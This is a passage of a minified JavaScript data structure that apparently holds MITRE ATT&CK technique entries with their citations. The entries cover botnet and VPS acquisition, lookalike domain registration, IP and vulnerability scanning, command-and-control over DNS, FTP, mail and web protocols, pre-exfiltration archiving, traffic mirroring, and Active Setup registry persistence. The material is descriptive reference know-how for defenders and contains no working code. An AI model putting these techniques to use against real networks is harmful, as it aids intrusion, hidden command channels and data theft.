href='https:\u002F\u002Fwww.venafi.com\u002Fblog\u002Fgrowing-abuse-ssh-keys-commodity-malware-campaigns-now-equipped-ssh-capabilities'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.cybereason.com\u002Fblog\u002Fnew-pervasive-worm-exploiting-linux-exim-server-vulnerability'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";iR.external_references=[{source_name:b,external_id:iS,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1098\u002F004"},{source_name:iT,url:"https:\u002F\u002Fwww.ssh.com\u002Fssh\u002Fauthorized_keys\u002F",description:"ssh.com. (n.d.). Authorized_keys File in SSH. Retrieved June 24, 2020."},{source_name:"Venafi SSH Key Abuse",url:"https:\u002F\u002Fwww.venafi.com\u002Fblog\u002Fgrowing-abuse-ssh-keys-commodity-malware-campaigns-now-equipped-ssh-capabilities",description:"Blachman, Y. (2020, April 22). Growing Abuse of SSH Keys: Commodity Malware Campaigns Now Equipped with SSH Capabilities. Retrieved June 24, 2020."},{source_name:"Cybereason Linux Exim Worm",url:"https:\u002F\u002Fwww.cybereason.com\u002Fblog\u002Fnew-pervasive-worm-exploiting-linux-exim-server-vulnerability",description:"Cybereason Nocturnus. (2019, June 13). New Pervasive Worm Exploiting Linux Exim Server Vulnerability. Retrieved June 24, 2020."}];iR["subtechnique-of"]=aL;iX.id=iY;iX["object-type"]=a;iX.name=iZ;iX.description="Adversaries may buy, lease, or rent a network of compromised systems that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fus.norton.com\u002Finternetsecurity-malware-what-is-a-botnet.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries may purchase a subscription to use an existing botnet from a booter\u002Fstresser service. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566'\u003EPhishing\u003C\u002Fa\u003E or Distributed Denial of Service (DDoS).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.imperva.com\u002Flearn\u002Fddos\u002Fbooters-stressers-ddosers\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fkrebsonsecurity.com\u002F2017\u002F01\u002Fwho-is-anna-senpai-the-mirai-worm-author\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fkrebsonsecurity.com\u002F2016\u002F10\u002Fhackforums-shutters-booter-service-bazaar\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fkrebsonsecurity.com\u002F2016\u002F10\u002Fare-the-days-of-booter-services-numbered\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";iX.external_references=[{source_name:b,external_id:iY,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583\u002F005"},{source_name:i_,url:i$,description:ja},{source_name:jb,url:jc,description:jd},{source_name:"Krebs-Anna",description:"Brian Krebs. (2017, January 18). Who is Anna-Senpai, the Mirai Worm Author?. Retrieved May 15, 2017.",url:"https:\u002F\u002Fkrebsonsecurity.com\u002F2017\u002F01\u002Fwho-is-anna-senpai-the-mirai-worm-author\u002F"},{source_name:"Krebs-Bazaar",description:"Brian Krebs. (2016, October 31). Hackforums Shutters Booter Service Bazaar. Retrieved May 15, 2017.",url:"https:\u002F\u002Fkrebsonsecurity.com\u002F2016\u002F10\u002Fhackforums-shutters-booter-service-bazaar\u002F"},{source_name:"Krebs-Booter",description:"Brian Krebs. (2016, October 27). Are the Days of “Booter” Services Numbered?. Retrieved May 15, 2017.",url:"https:\u002F\u002Fkrebsonsecurity.com\u002F2016\u002F10\u002Fare-the-days-of-booter-services-numbered\u002F"}];iX["subtechnique-of"]=R;je.id=jf;je["object-type"]=a;je.name=jg;je.description="Adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1071'\u003EApplication Layer Protocol\u003C\u002Fa\u003E). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.\n\nBy running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic (\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1071\u002F004'\u003EDNS\u003C\u002Fa\u003E). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.\u003Csup\u003E\u003Ca href='https:\u002F\u002Funit42.paloaltonetworks.com\u002Fdns-tunneling-how-dns-can-be-abused-by-malicious-actors\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";je.external_references=[{source_name:b,external_id:jf,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583\u002F002"},{source_name:"Unit42 DNS Mar 2019",url:"https:\u002F\u002Funit42.paloaltonetworks.com\u002Fdns-tunneling-how-dns-can-be-abused-by-malicious-actors\u002F",description:"Hinchliffe, A. (2019, March 15). DNS Tunneling: how DNS can be (ab)used by malicious actors. Retrieved October 3, 2020."}];je["subtechnique-of"]=R;jh.id=ji;jh["object-type"]=a;jh.name=jj;jh.description="Adversaries may purchase domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.\n\nAdversaries can use purchased domains for a variety of purposes, including for \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566'\u003EPhishing\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1189'\u003EDrive-by Compromise\u003C\u002Fa\u003E, and Command and Control.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fus-cert.cisa.gov\u002Fncas\u002Falerts\u002Faa20-258a'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fglobal\u002Fen\u002Fcurrent-threats\u002Fpdfs\u002Frpt-apt28.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.zdnet.com\u002Farticle\u002Fpaypal-alert-beware-the-paypai-scam-5000109103\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Typosquatting may be used to aid in delivery of payloads via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1189'\u003EDrive-by Compromise\u003C\u002Fa\u003E. Adversaries can also use internationalized domain names (IDNs) to create visually similar lookalike domains for use in operations.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fus-cert.cisa.gov\u002Fncas\u002Ftips\u002FST05-016'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nDomain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fservices\u002Fpdfs\u002Fmandiant-apt1-report.pdf'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";jh.external_references=[{source_name:b,external_id:ji,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583\u002F001"},{external_id:"CAPEC-630",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F630.html"},{source_name:"CISA MSS Sep 2020",url:"https:\u002F\u002Fus-cert.cisa.gov\u002Fncas\u002Falerts\u002Faa20-258a",description:"CISA. (2020, September 14). Alert (AA20-258A): Chinese Ministry of State Security-Affiliated Cyber Threat Actor Activity. Retrieved October 1, 2020."},{source_name:"FireEye APT28",description:"FireEye. (2015). APT28: A WINDOW INTO RUSSIA’S CYBER ESPIONAGE OPERATIONS?. Retrieved August 19, 2015.",url:"https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fglobal\u002Fen\u002Fcurrent-threats\u002Fpdfs\u002Frpt-apt28.pdf"},{source_name:"PaypalScam",description:"Bob Sullivan. (2000, July 24). PayPal alert! Beware the 'PaypaI' scam. Retrieved March 2, 2017.",url:"https:\u002F\u002Fwww.zdnet.com\u002Farticle\u002Fpaypal-alert-beware-the-paypai-scam-5000109103\u002F"},{source_name:"CISA IDN ST05-016",url:"https:\u002F\u002Fus-cert.cisa.gov\u002Fncas\u002Ftips\u002FST05-016",description:"CISA. (2019, September 27). Security Tip (ST05-016): Understanding Internationalized Domain Names. Retrieved October 20, 2020."},{url:ai,description:aj,source_name:ak}];jh["subtechnique-of"]=R;jk.id=jl;jk["object-type"]=a;jk.name=jm;jk.description="Adversaries may buy, lease, or rent physical servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of compromising a third-party \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1584\u002F004'\u003EServer\u003C\u002Fa\u003E or renting a \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583\u002F003'\u003EVirtual Private Server\u003C\u002Fa\u003E, adversaries may opt to configure and run their own servers in support of operations.\n\nAdversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.nytimes.com\u002F2011\u002F01\u002F16\u002Fworld\u002Fmiddleeast\u002F16stuxnet.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";jk.external_references=[{source_name:b,external_id:jl,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583\u002F004"},{source_name:jn,description:jo,url:jp}];jk["subtechnique-of"]=R;jq.id=jr;jq["object-type"]=a;jq.name=js;jq.description="Adversaries may rent Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines\u002Fcontainers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.\n\nAcquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocuments.trendmicro.com\u002Fassets\u002Fwp\u002Fwp-criminal-hideouts-for-lease.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";jq.external_references=[{source_name:b,external_id:jr,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583\u002F003"},{source_name:iU,description:iV,url:iW}];jq["subtechnique-of"]=R;jt.id=ju;jt["object-type"]=a;jt.name=jv;jt.description="Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control (\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1102'\u003EWeb Service\u003C\u002Fa\u003E) or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1567'\u003EExfiltration Over Web Service\u003C\u002Fa\u003E. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.";jt.external_references=[{source_name:b,external_id:ju,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583\u002F006"}];jt["subtechnique-of"]=R;jz.id=jA;jz["object-type"]=a;jz.name="Scanning IP Blocks";jz.description="Adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.\n\nAdversaries may scan IP blocks in order to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1590'\u003EGather Victim Network Information\u003C\u002Fa\u003E, such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software\u002Fversions via server banners or other network artifacts.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.caida.org\u002Fpublications\u002Fpapers\u002F2012\u002Fanalysis_slash_zero\u002Fanalysis_slash_zero.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Information from these scans may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596'\u003ESearch Open Technical Databases\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1587'\u003EDevelop Capabilities\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588'\u003EObtain Capabilities\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1133'\u003EExternal Remote Services\u003C\u002Fa\u003E).";jz.external_references=[{source_name:b,external_id:jA,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1595\u002F001"},{source_name:jw,url:jx,description:jy}];jz["subtechnique-of"]=cl;jB.id=jC;jB["object-type"]=a;jB.name="Vulnerability Scanning";jB.description="Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host\u002Fapplication (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.\n\nThese scans may also include more broad attempts to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1592'\u003EGather Victim Host Information\u003C\u002Fa\u003E that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwiki.owasp.org\u002Findex.php\u002FOAT-014_Vulnerability_Scanning'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Information from these scans may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596'\u003ESearch Open Technical Databases\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1587'\u003EDevelop Capabilities\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588'\u003EObtain Capabilities\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1190'\u003EExploit Public-Facing Application\u003C\u002Fa\u003E).";jB.external_references=[{source_name:b,external_id:jC,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1595\u002F002"},{source_name:"OWASP Vuln Scanning",url:"https:\u002F\u002Fwiki.owasp.org\u002Findex.php\u002FOAT-014_Vulnerability_Scanning",description:"OWASP Wiki. (2018, February 16). OAT-014 Vulnerability Scanning. Retrieved October 20, 2020."}];jB["subtechnique-of"]=cl;jD.id=jE;jD["object-type"]=a;jD.name=jF;jD.description="Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection\u002Fnetwork filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.paloaltonetworks.com\u002Fcyberpedia\u002Fwhat-is-dns-tunneling'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedium.com\u002F@galolbardes\u002Flearn-how-easy-is-to-bypass-firewalls-using-dns-tunneling-and-also-how-to-block-it-3ed652f4a000'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E ";jD.external_references=[{source_name:b,external_id:jE,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1071\u002F004"},{source_name:"PAN DNS Tunneling",url:"https:\u002F\u002Fwww.paloaltonetworks.com\u002Fcyberpedia\u002Fwhat-is-dns-tunneling",description:"Palo Alto Networks. (n.d.). What Is DNS Tunneling?. Retrieved March 15, 2020."},{source_name:"Medium DnsTunneling",url:"https:\u002F\u002Fmedium.com\u002F@galolbardes\u002Flearn-how-easy-is-to-bypass-firewalls-using-dns-tunneling-and-also-how-to-block-it-3ed652f4a000",description:"Galobardes, R. (2018, October 30). Learn how easy is to bypass firewalls using DNS tunneling (and also how to block it). Retrieved March 15, 2020."},{url:f,description:g,source_name:h}];jD["subtechnique-of"]=aM;jG.id=jH;jG["object-type"]=a;jG.name="File Transfer Protocols";jG.description="Adversaries may communicate using application layer protocols associated with transferring files to avoid detection\u002Fnetwork filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as FTP, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ";jG.external_references=[{source_name:b,external_id:jH,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1071\u002F002"},{url:f,description:g,source_name:h}];jG["subtechnique-of"]=aM;jI.id=jJ;jI["object-type"]=a;jI.name="Mail Protocols";jI.description="Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection\u002Fnetwork filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMTP\u002FS, POP3\u002FS, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ";jI.external_references=[{source_name:b,external_id:jJ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1071\u002F003"},{url:f,description:g,source_name:h}];jI["subtechnique-of"]=aM;jK.id=jL;jK["object-type"]=a;jK.name="Web Protocols";jK.description="Adversaries may communicate using application layer protocols associated with web traffic to avoid detection\u002Fnetwork filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP\u002FS packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ";jK.external_references=[{source_name:b,external_id:jL,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1071\u002F001"},{url:f,description:g,source_name:h}];jK["subtechnique-of"]=aM;jN.id=jO;jN["object-type"]=a;jN.name="Archive via Custom Method";jN.description="An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.welivesecurity.com\u002Fwp-content\u002Fuploads\u002F2016\u002F10\u002Feset-sednit-part-2.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";jN.external_references=[{source_name:b,external_id:jO,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1560\u002F003"},{url:"http:\u002F\u002Fwww.welivesecurity.com\u002Fwp-content\u002Fuploads\u002F2016\u002F10\u002Feset-sednit-part-2.pdf",description:"ESET. (2016, October). En Route with Sednit - Part 2: Observing the Comings and Goings. Retrieved November 21, 2016.",source_name:"ESET Sednit Part 2"}];jN["subtechnique-of"]=bk;jP.id=jQ;jP["object-type"]=a;jP.name="Archive via Library";jP.description="An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F006'\u003EPython\u003C\u002Fa\u003E rarfile \u003Csup\u003E\u003Ca href='https:\u002F\u002Fpypi.org\u002Fproject\u002Frarfile\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, libzip \u003Csup\u003E\u003Ca href='https:\u002F\u002Flibzip.org\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, and zlib \u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fmadler\u002Fzlib'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E. Most libraries include functionality to encrypt and\u002For compress data.\n\nSome archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.";jP.external_references=[{source_name:b,external_id:jQ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1560\u002F002"},{source_name:"PyPI RAR",url:"https:\u002F\u002Fpypi.org\u002Fproject\u002Frarfile\u002F",description:"mkz. (2020). rarfile 3.1. Retrieved February 20, 2020."},{source_name:"libzip",url:"https:\u002F\u002Flibzip.org\u002F",description:"D. Baron, T. Klausner. (2020). libzip. Retrieved February 20, 2020."},{source_name:"Zlib Github",url:"https:\u002F\u002Fgithub.com\u002Fmadler\u002Fzlib",description:"madler. (2017). zlib. Retrieved February 20, 2020."},{url:dT,description:dU,source_name:dV}];jP["subtechnique-of"]=bk;jR.id=jS;jR["object-type"]=a;jR.name="Archive via Utility";jR.description="An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities. Many utilities exist that can archive data, including 7-Zip\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.7-zip.org\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, WinRAR\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.rarlab.com\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, and WinZip\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.winzip.com\u002Fwin\u002Fen\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E. Most utilities include functionality to encrypt and\u002For compress data.\n\nSome 3rd party utilities may be preinstalled, such as `tar` on Linux and macOS or `zip` on Windows systems.";jR.external_references=[{source_name:b,external_id:jS,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1560\u002F001"},{source_name:"7zip Homepage",url:"https:\u002F\u002Fwww.7-zip.org\u002F",description:"I. Pavlov. (2019). 7-Zip. Retrieved February 20, 2020."},{source_name:"WinRAR Homepage",url:"https:\u002F\u002Fwww.rarlab.com\u002F",description:"A. Roshal. (2020). RARLAB. Retrieved February 20, 2020."},{source_name:"WinZip Homepage",url:"https:\u002F\u002Fwww.winzip.com\u002Fwin\u002Fen\u002F",description:"Corel Corporation. (2020). WinZip. Retrieved February 20, 2020."},{url:dT,description:dU,source_name:dV}];jR["subtechnique-of"]=bk;jX.id=jY;jX["object-type"]=a;jX.name="Traffic Duplication";jX.description="Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised network infrastructure.  Traffic mirroring is a native feature for some network devices and used for network analysis and may be configured to duplicate traffic and forward to one or more destinations for analysis by a network analyzer or other monitoring device. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.cisco.com\u002Fc\u002Fen\u002Fus\u002Ftd\u002Fdocs\u002Frouters\u002Fcrs\u002Fsoftware\u002Fcrs_r5-1\u002Finterfaces\u002Fconfiguration\u002Fguide\u002Fhc51xcrsbook\u002Fhc51span.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.juniper.net\u002Fdocumentation\u002Fen_US\u002Fjunos\u002Ftopics\u002Fconcept\u002Fport-mirroring-ex-series.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other network infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1542\u002F004'\u003EROMMONkit\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1601\u002F001'\u003EPatch System Image\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.us-cert.gov\u002Fncas\u002Falerts\u002FTA18-106A'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcommunity.cisco.com\u002Ft5\u002Fsecurity-blogs\u002Fattackers-continue-to-target-legacy-devices\u002Fba-p\u002F4169954'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries may use traffic duplication in conjunction with \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1040'\u003ENetwork Sniffing\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1056'\u003EInput Capture\u003C\u002Fa\u003E, or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1557'\u003EMan-in-the-Middle\u003C\u002Fa\u003E depending on the goals and objectives of the adversary.";jX.external_references=[{source_name:b,external_id:jY,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1020\u002F001"},{external_id:"CAPEC-117",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F117.html"},{source_name:"Cisco Traffic Mirroring",url:"https:\u002F\u002Fwww.cisco.com\u002Fc\u002Fen\u002Fus\u002Ftd\u002Fdocs\u002Frouters\u002Fcrs\u002Fsoftware\u002Fcrs_r5-1\u002Finterfaces\u002Fconfiguration\u002Fguide\u002Fhc51xcrsbook\u002Fhc51span.html",description:"Cisco. (n.d.). Cisco IOS XR Interface and Hardware Component Configuration Guide for the Cisco CRS Router, Release 5.1.x. Retrieved October 19, 2020."},{source_name:"Juniper Traffic Mirroring",url:"https:\u002F\u002Fwww.juniper.net\u002Fdocumentation\u002Fen_US\u002Fjunos\u002Ftopics\u002Fconcept\u002Fport-mirroring-ex-series.html",description:"Juniper. (n.d.). Understanding Port Mirroring on EX2200, EX3200, EX3300, EX4200, EX4500, EX4550, EX6200, and EX8200 Series Switches. Retrieved October 19, 2020."},{source_name:dX,url:dY,description:dZ},{source_name:K,url:L,description:M}];jX["subtechnique-of"]=dW;ks.id=kt;ks["object-type"]=a;ks.name="Active Setup";ks.description="Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fhelgeklein.com\u002Fblog\u002F2010\u002F04\u002Factive-setup-explained\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nAdversaries may abuse Active Setup by creating a key under \u003Ccode\u003E HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\\u003C\u002Fcode\u003E and setting a malicious value for \u003Ccode\u003EStubPath\u003C\u002Fcode\u003E. This value will serve as the program that will be executed when a user logs into the computer.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdigital-forensics.sans.org\u002Fsummit-archives\u002F2010\u002F35-glyer-apt-persistence-mechanisms.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcitizenlab.ca\u002F2015\u002F12\u002Fpackrat-report\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2012\u002F12\u002Fcouncil-foreign-relations-water-hole-attack-details.html'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsecurelist.com\u002Fwhos-really-spreading-through-the-bright-star\u002F68978\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca 